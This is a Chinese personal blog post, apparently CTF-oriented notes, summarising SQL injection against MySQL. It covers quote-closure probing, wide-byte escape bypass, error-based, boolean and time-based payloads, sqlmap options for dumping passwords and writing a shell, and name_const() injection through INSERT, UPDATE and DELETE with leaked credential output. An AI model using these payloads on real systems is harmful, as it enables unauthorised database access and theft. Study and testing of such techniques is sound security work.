<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sql注入总结 | micgo's blog</title><meta name="keywords" content="sql注入"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="常用闭合方式判断判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)，都不行的话试试宽字节注入 当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？ 抄袭一波大神的判断方式 遇到SQL注入第一步判断闭合：首先尝试： ?id&#x3D;1’?id&#x3D;1” 1如果都报错，则为整形闭合。 2如果单引号报错，双引号不报错。然后尝试 ?id&amp;#">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入总结">
<meta property="og:url" content="https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="micgo&#39;s blog">
<meta property="og:description" content="常用闭合方式判断判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)，都不行的话试试宽字节注入 当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？ 抄袭一波大神的判断方式 遇到SQL注入第一步判断闭合：首先尝试： ?id&#x3D;1’?id&#x3D;1” 1如果都报错，则为整形闭合。 2如果单引号报错，双引号不报错。然后尝试 ?id&amp;#">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
<meta property="article:published_time" content="2022-09-25T16:00:00.000Z">
<meta property="article:modified_time" content="2023-03-22T12:33:11.841Z">
<meta property="article:author" content="micgo">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sql注入总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-22 20:33:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql注入总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-25T16:00:00.000Z" title="发表于 2022-09-26 00:00:00">2022-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-22T12:33:11.841Z" title="更新于 2023-03-22 20:33:11">2023-03-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">漏洞总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql注入总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>常用闭合方式判断<br>判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)，都不行的话试试宽字节注入</p>
<p>当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？</p>
<p>抄袭一波大神的判断方式</p>
<p>遇到SQL注入第一步判断闭合：<br>首先尝试：</p>
<p>?id&#x3D;1’<br>?id&#x3D;1”</p>
<p>1如果都报错，则为整形闭合。</p>
<p>2如果单引号报错，双引号不报错。<br>然后尝试</p>
<p>?id&#x3D;1’ –+<br>?id&#x3D;1’ #</p>
<p>无报错则单引号闭合。<br>报错则单引号加括号。</p>
<p>3如果单引号不报错，双引号报错。<br>然后尝试</p>
<p>?id&#x3D;1” –+<br>?id&#x3D;1” #</p>
<p>无报错则双引号闭合。<br>报错则双引号加括号。</p>
<p>输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p>
<p>?id&#x3D;1 and true –+<br>或者<br>?id&#x3D;true and true –+</p>
<p>输入，错误回显</p>
<p>?id&#x3D;1 and false –+<br>或者<br>?id&#x3D;true and false –+</p>
<p>那么就是整形闭合</p>
<p>输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p>
<p>?id&#x3D;1’ and true –+<br>或者<br>?id&#x3D;true‘ and true –+</p>
<p>输入，错误回显</p>
<p>?id&#x3D;1’ and false –+<br>或者<br>?id&#x3D;true‘ and false –+</p>
<p>那么就是单引号闭合，其他符号同理</p>
<p>单引号转义绕过<br>当时用单引号’，代码转义为\’，就使用如下方式替换掉单引号</p>
<p>%df%27<br>�’<br>%EF%BF%BD</p>
<p>万能密码</p>
<p>�’ and1&#x3D;1 #<br>database()<br>返回当前数据库名</p>
<p>version()<br>返回数据库的版本号</p>
<p>CONCAT(s1,s2…sn)<br>字符串 s1,s2 等多个字符串合并为一个字符串</p>
<p>CONCAT_WS(x, s1,s2…sn)<br>同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符</p>
<p>LIMIT<br>mysql&gt; SELECT * FROM table LIMIT 5,10; &#x2F;&#x2F; 检索记录行 6-15</p>
<p>&#x2F;&#x2F;为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1：<br>mysql&gt; SELECT * FROM table LIMIT 95,-1; &#x2F;&#x2F; 检索记录行 96-last.</p>
<p>&#x2F;&#x2F;如果只给定一个参数，它表示返回最大的记录行数目：<br>mysql&gt; SELECT * FROM table LIMIT 5; &#x2F;&#x2F;检索前 5 个记录行</p>
<p>&#x2F;&#x2F;换句话说，LIMIT n 等价于 LIMIT 0,n。</p>
<p>mid() substr（）</p>
<p>Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p>
<p>string substring(string, start, length)</p>
<p>string substr(string, start, length)</p>
<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p>
<p>ASCII<br>返回字符串 s 的第一个字符的 ASCII 码。<br>返回 CustomerName 字段第一个字母的 ASCII 码：</p>
<p>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar<br>FROM Customers;</p>
<p>count<br>返回查询的记录总数，expression 参数是一个字段或者 * 号</p>
<p>返回 Products 表中 products 字段总共有多少条记录：</p>
<p>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products;</p>
<p>所以，只要发现有SQL注入，我们可以操纵SQL语句，将mysql数据库的库，表，字段一个一个查询出来</p>
<p>实在不行的话，试一下<strong>弱密码</strong></p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; or 1=if(ascii(substr((database()),1,1))&gt;1000,0,1)#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> wfy_admin )),<span class="number">0</span>)#</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select(group_concat(text))from(wfy_comments)where(text)regexp(&#x27;</span>&#125;$<span class="string">&#x27;)),0x7e),1)%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%27+or+updatexml%281%2Cconcat%280x7e%2C%28select%28group_concat%28text%29%29from%28wfy_comments%29where%28text%29like%28%27f%%27%29%29%2C0x7e%29%2C1%29%23</span></span><br><span class="line"><span class="string">/*    &#x27;</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>(<span class="keyword">select</span>(group_concat(text))<span class="keyword">from</span>(wfy_comments)<span class="keyword">where</span>(text)<span class="keyword">like</span>(<span class="string">&#x27;f%&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#  <span class="operator">*</span><span class="operator">/</span> </span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||&#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;or/**/if(1,0,0)/**/or/**/benchmark(1000000000,0)#</span></span><br></pre></td></tr></table></figure>

<p>注意有可能爆出来中文…………，可以直接regexp或者like匹配到flag，或者16进制编码处理一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure>



<h5 id="sqlmap工具的详细使用"><a href="#sqlmap工具的详细使用" class="headerlink" title="sqlmap工具的详细使用"></a>sqlmap工具的详细使用</h5><p>注入参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-u 			#注入点</span><br><span class="line">-g  		#谷歌搜索</span><br><span class="line">-f 			#指纹判别数据库类型</span><br><span class="line">-b			#获取数据库版本信息</span><br><span class="line">-p	 		#指定可测试的参数（?page=1&amp;id=2 -p&quot;page,id&quot;）</span><br><span class="line">-D &quot;&quot;  		 #指定数据库名</span><br><span class="line">-T &quot;&quot;    	 #指定表名</span><br><span class="line">-C &quot;&quot; 		 #指定字段</span><br><span class="line">-s &quot;&quot;   	 #保存注入过程到一个文件，还可中断，下次恢复在注入（保存：-s “xx.log” -resume）</span><br><span class="line">-columns 	  #列出字段</span><br><span class="line">-current-user #获取当前用户名称</span><br><span class="line">-current-db   #获取当前数据库名称</span><br><span class="line">-users        #列出数据库所有用户</span><br><span class="line">-passwords    #数据库用户所有密码</span><br><span class="line">-privileges   #查看用户权限（-privileges -U root）</span><br><span class="line">-U 			 #指定数据库用户</span><br><span class="line">-dbs 		  #列出所有数据库</span><br><span class="line">-tables -D &quot;&quot;  #列出指定数据库中的表</span><br><span class="line">-columns -T &quot;user&quot; -D &quot;mysql&quot; #列出mysql数据库中的user表的所有字段</span><br><span class="line">-dump-all 					#列出所有数据库所有表</span><br><span class="line">-exclude-sysdbs 			 #只列出用户自己新建的数据库和表</span><br><span class="line">-dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;  	  #列出指定数据库的表的字段的数据（-dump -T users -D master -C surname）</span><br><span class="line">-dump -T &quot;&quot;-D &quot;&quot; -start 2 -top 4 #列出指定数据库的表的2-4字段的数据</span><br><span class="line">-dbms 				#指定数据库（MySQL，Oracle，PostgreSQL，Microsoft SQL Sever，Microsoft Access，						SQLite，Firebird，Sybase，SAP，MaxDB）</span><br><span class="line">-os 				#指定系统（Linux，Windows）</span><br><span class="line">-sql -shell    		 #写shell</span><br><span class="line">-delay 		   		 #延迟的时间</span><br><span class="line">-m 			   		#可以执行多个url</span><br><span class="line">–lever 3 --risk 5 	 #调整SQL注入的强度</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>post传参</strong></p>
<p>抓包，保存为txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -p 参数名</span><br><span class="line">#-r表示加载一个文件，-p指定参数</span><br></pre></td></tr></table></figure>



<p><strong>自定义脚本tamper</strong></p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20220812205150887.png" alt="image-20220812205150887"></p>
<h5 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h5><p><strong>insert用法</strong></p>
<p>sql语句为 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Student VALUES (&#x27;bob&#x27;, &#x27;15&#x27;, &#x27;99&#x27;)</span><br></pre></td></tr></table></figure>

<p>当然也可在指定的列中插入数据，例如 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Student(name,age) VALUES (&#x27;bob&#x27;, &#x27;15&#x27;)</span><br></pre></td></tr></table></figure>



<p>同时，insert还可以在数据库查询语句中用作字符串替换，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select insert(&quot;admin&quot;, 1, 1, &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>上述语句查询结果为：</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cb1c4644d8009cecd2a85e4c801a4271.png" alt="image-20211110082442571"></p>
<p>可以看见，insert语句可以将字符串指定位置的指定长度替换为指定字符串，该功能的insert语法为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT(s1，x，len，s2)</span><br></pre></td></tr></table></figure>

<p>其中的s1为目标字符串，x为替换的起始位置，len为替换的长度，s2为替换的字符串。通过改变len的值，可以获取到不同长度的字符串：</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/39fb30f5985d76a07d63447e216bc855.png" alt="image-20211110084334619"></p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3118fd4b98ccf9df4ecd2310e8705f49.png" alt="image-20211110084405289"></p>
<p>insert进行盲注爆破<br>那么，如果将两个insert套起来，是不是就相当于字符串的分割了呢，在第一个insert得到的字符串在进行一次insert的字符串替换，是不是就相当于字符串分割了，例如，输入语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert(&quot;admin&quot;, 1, 0, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">select insert(insert(&quot;admin&quot;, 1, 1, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">select insert(insert(&quot;admin&quot;, 1, 2, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">select insert(insert(&quot;admin&quot;, 1, 3, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>其运行结果为：</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/605a2553da68ba5efd9f6aba24a654cf.png" alt="image-20211109215916734"></p>
<p>这样，就可以很好的进行盲注的爆破了，并且insert语句也不易被检测到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into member(username,<span class="built_in">id</span>) values(<span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>) o<span class="string">r&#x27;&#x27;</span> , <span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/15592525-d171ca72aa1c81a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/413/format/webp" alt="img"></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(命令)),<span class="number">0</span>) o<span class="string">r&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(命令)) o<span class="string">r&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/15592525-0e7af7188bc3c342.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
<p><strong>利用name_const()获取数据</strong></p>
<p>name_const()函数是 MYSQL5.0.12 版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or</span><br></pre></td></tr></table></figure>

<p>Insert：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;micgo&#x27;</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(name_const(version(),<span class="number">1</span>)),name_const(version(),<span class="number">1</span>))a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;Nervo&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>update：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;Nicky&#x27;</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(name_const(version(),<span class="number">1</span>)),name_const(version(),<span class="number">1</span>))a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span><span class="string">&#x27;Nervo&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>delete：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(name_const(version(),<span class="number">1</span>)),name_const(version(),<span class="number">1</span>))a)<span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>提取数据：</p>
<p>在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。在这里我使用MySQL5.0.45进行演示。</p>
<p>首先，我们做一个简单的SELECT查询，检查我们是否可以提取数据。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;micgo&#x27;</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span><span class="operator">*</span><span class="keyword">FROM</span>(<span class="keyword">SELECT</span> name_const((<span class="keyword">SELECT</span> <span class="number">2</span>),<span class="number">1</span>),name_const((<span class="keyword">SELECT</span> <span class="number">2</span>),<span class="number">1</span>))a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;Nervo&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就不行了</p>
<p>如果显示ERROR 1060 (42S21): Duplicate column name ‘2’，就可以进一步获取更多数据</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/2014091813502258628.png" alt="enter image description here"></p>
<p>获取newdb数据库表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (1,&#x27;Olivia&#x27; or (SELECT*FROM(SELECT name_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1))a) or &#x27;&#x27;, &#x27;Nervo&#x27;);</span><br><span class="line"></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;users&#x27;</span><br></pre></td></tr></table></figure>

<p>获取users表的列名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (1,&#x27;Olivia&#x27; or (SELECT*FROM(SELECT name_const((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; limit 0,1),1),name_const(( SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; limit 0,1),1))a) or &#x27;&#x27;, &#x27;Nervo&#x27;);</span><br><span class="line"></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br></pre></td></tr></table></figure>

<p>获取users表的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (2,&#x27;Olivia&#x27; or (SELECT*FROM(SELECT name_const((SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1),name_const(( SELECT concat_ws(0x7e,id, username, password) FROM users limit</span><br><span class="line">0,1),1))a) or &#x27;&#x27;, &#x27;Nervo&#x27;);</span><br><span class="line"></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;1~Jane~Eyre&#x27;</span><br></pre></td></tr></table></figure>





<p>首先逐个测试闭合点，然后用&#x2F;*   *&#x2F;注释符找出先后顺序，然后进行注入</p>
